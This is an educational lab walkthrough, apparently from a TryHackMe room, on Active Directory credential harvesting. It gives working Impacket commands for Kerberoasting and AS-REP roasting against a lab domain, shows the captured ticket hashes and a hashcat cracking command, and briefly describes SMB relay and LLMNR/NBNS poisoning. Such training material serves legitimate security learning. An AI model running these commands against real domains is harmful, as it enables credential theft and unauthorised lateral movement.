# Credentials Harvesting Attacks in Active Directory

In previous tasks, we assumed initial access to a system and focused on obtaining credentials from memory or files within Windows. However, there are also network-based attacks that can be used to harvest credentials in a victim network.

This section introduces several Windows and Active Directory (AD) attacks for obtaining credential hashes. Before diving deeper, it's recommended to be familiar with the Kerberos protocol and NTLM (New Technology LAN Manager), which are commonly used for authentication in Windows environments.

---

## Kerberoasting

Kerberoasting is a common AD attack that targets Service Principal Name (SPN) accounts (e.g., IIS User, MSSQL). The attacker requests a Ticket Granting Service (TGS) ticket for an SPN account, which can then be cracked offline to obtain credentials. This attack enables privilege escalation and lateral movement.

**Demo Steps:**

1. **Enumerate SPN Accounts:**

    ```bash
    python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip MACHINE_IP THM.red/thm
    ```

    Example output:

    ```
    ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation
    ----------------------------  -------  --------  --------------------------  ---------  ----------
    http/creds-harvestin.thm.red  svc-user            2022-06-04 00:15:18.413578  
    ```

2. **Request a TGS Ticket for the SPN Account:**

    ```bash
    python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip MACHINE_IP THM.red/thm -request-user svc-user 
    ```

    Example output includes a hash:

    ```
    $krb5tgs$23$*svc-user$THM.RED$THM.red/svc-user*$8f5de4211da1cd5715217[*REMOVED*]7bfa3680658dd9812ac061c5
    ```

3. **Crack the TGS Ticket Hash with Hashcat:**

    ```bash
    hashcat -a 0 -m 13100 spn.hash /usr/share/wordlists/rockyou.txt
    ```

Try replicating these steps against the attached VM: find the SPN user, perform the Kerberoasting attack, obtain the ticket, and crack it.

---

## AS-REP Roasting

AS-REP Roasting targets AD users with the "Do not require Kerberos pre-authentication" option enabled. This allows attackers to request authentication data without needing a password, retrieve password hashes, and attempt offline cracking.

**Steps:**

1. **Prepare a List of Domain Users (e.g., `/tmp/users.txt`):**

    ```
    Administrator
    admin
    thm
    test
    sshd
    victim
    CREDS-HARVESTIN$
    ```

2. **Perform the AS-REP Roasting Attack:**

    ```bash
    python3.9 /opt/impacket/examples/GetNPUsers.py -dc-ip MACHINE_IP thm.red/ -usersfile /tmp/users.txt
    ```

    Example output:

    ```
    [-] User thm doesn't have UF_DONT_REQUIRE_PREAUTH set
    $krb5asrep$23$victim@THM.RED:166c95418fb9dc495789fe9[**REMOVED**]1e8d2ef27$6a0e13abb5c99c07
    ```

Impacket's `GetNPUsers.py` can export tickets in John or Hashcat format using the `-format` argument.

---

## SMB Relay Attack

The SMB Relay attack exploits the NTLM challenge-response protocol. By performing a Man-in-the-Middle attack, an attacker can capture SMB packets and extract hashes. This attack requires SMB signing to be disabled.

For more details, refer to the THM Exploiting AD room.

---

## LLMNR/NBNS Poisoning

LLMNR (Link-Local Multicast Name Resolution) and NBNS (NetBIOS Name Service) help machines resolve names when DNS fails. Attackers can spoof responses to these protocols, tricking victims into sending authentication data to the attacker.

**Goal:**  
Both SMB relay and LLMNR/NBNS poisoning attacks aim to capture NTLM authentication hashes, which can be used to access victim accounts or machines.

For more information, see the THM Breaching AD room.

---